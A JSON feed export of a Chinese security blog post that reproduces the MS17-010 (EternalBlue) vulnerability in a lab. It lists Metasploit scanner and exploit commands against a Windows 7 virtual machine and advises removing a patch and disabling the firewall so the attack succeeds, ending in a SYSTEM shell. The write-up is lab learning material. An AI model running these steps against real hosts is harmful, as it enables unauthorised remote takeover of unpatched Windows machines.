{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"ms17\" tag",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/65089f0a/",
            "url": "http://dpm12345.cn/posts/65089f0a/",
            "title": "ms17-010 漏洞复现",
            "date_published": "2022-08-24T05:05:51.000Z",
            "content_html": "<h1 id=\"漏洞介绍\"><a class=\"anchor\" href=\"#漏洞介绍\">#</a> 漏洞介绍</h1>\n<h2 id=\"名称\"><a class=\"anchor\" href=\"#名称\">#</a> 名称</h2>\n<p>MS17-010，又称永恒之蓝</p>\n<h2 id=\"利用原理\"><a class=\"anchor\" href=\"#利用原理\">#</a> 利用原理</h2>\n<p>永恒之蓝漏洞通过 TCP 的 445 和 139 端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放 445 文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。不法分子就能在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序。</p>\n<h2 id=\"影响版本\"><a class=\"anchor\" href=\"#影响版本\">#</a> 影响版本</h2>\n<p>目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>\n<h1 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现</h1>\n<h2 id=\"复现环境\"><a class=\"anchor\" href=\"#复现环境\">#</a> 复现环境</h2>\n<ul>\n<li>攻击机：kali</li>\n<li>目标机：windows_7_professional_with_sp1_x64</li>\n</ul>\n<p>实验条件：双方机子可以相互 ping 通，目标机开启了 445 端口，并且关闭了防火墙</p>\n<p><span class=\"red\">注：1. netstat -an 查看端口开启状态，如果未开启，可以采用以下方法</span></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>1、按 “Win+R” 组合键，输入 regedit 打开注册表编辑器；</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>2、打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\NetBT\\Parameters ；</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>3、在右侧找到 SMBDeviceEnabled，双击将键值更改为 1 ；</pre></td></tr></table></figure><p><span class=\"red\">2. 如果端口开启，再检查防火墙是否关闭（之前就因为防火墙没关导致 nmap 扫描不出)</span></p>\n<p><span class=\"red\">3. 如果为了安装 VMware tools 的驱动而安装了 KB4474419 的补丁，那么在开始之前需要将更新卸载掉，不然无法利用该漏洞</span></p>\n<h2 id=\"复现过程\"><a class=\"anchor\" href=\"#复现过程\">#</a> 复现过程</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token number\">192.168</span>.47.139  <span class=\"token comment\">#扫描目标机</span></pre></td></tr></table></figure><p>返回</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_1.jpg\" alt=\"\" /></p>\n<p>可以看到 445 端口的状态为 <code>open</code></p>\n<h3 id=\"使用-msfconsole-的永恒之蓝模块\"><a class=\"anchor\" href=\"#使用-msfconsole-的永恒之蓝模块\">#</a> 使用 msfconsole 的永恒之蓝模块</h3>\n<h3 id=\"搜索使用\"><a class=\"anchor\" href=\"#搜索使用\">#</a> 搜索使用</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search ms17-010</pre></td></tr></table></figure><p>得到</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_2.jpg\" alt=\"\" /></p>\n<p>其中</p>\n<p><code>exploit/windows/smb/ms17_010_eternalblue</code>  为攻击模块</p>\n<p><code>auxiliary/scanner/smb/smb_ms17_010</code>  为扫描模块</p>\n<h3 id=\"扫描\"><a class=\"anchor\" href=\"#扫描\">#</a> 扫描</h3>\n<p>依次执行以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use auxiliary/scanner/smb/smb_ms17_010</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">192.168</span>.47.139 <span class=\"token comment\"># rhost 值为目标机 ip</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run</pre></td></tr></table></figure><p>当返回</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_3.jpg\" alt=\"\" /></p>\n<p>代表该漏洞可以利用，如果返回 <code>Host does NOT appear vulnerable.</code> ，则检查更新安装情况，尝试卸载</p>\n<h3 id=\"攻击\"><a class=\"anchor\" href=\"#攻击\">#</a> 攻击</h3>\n<p>依次执行以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/windows/smb/ms17_010_eternalblue</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">192.168</span>.47.139</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_4.jpg\" alt=\"\" /></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010_5.jpg\" alt=\"\" /></p>\n<p>可以看到为系统权限</p>\n<p>输入 <code>shell</code> ，若有乱码，那么再输入 <code>chcp 65001</code></p>\n",
            "tags": [
                "ms17",
                "msf"
            ]
        }
    ]
}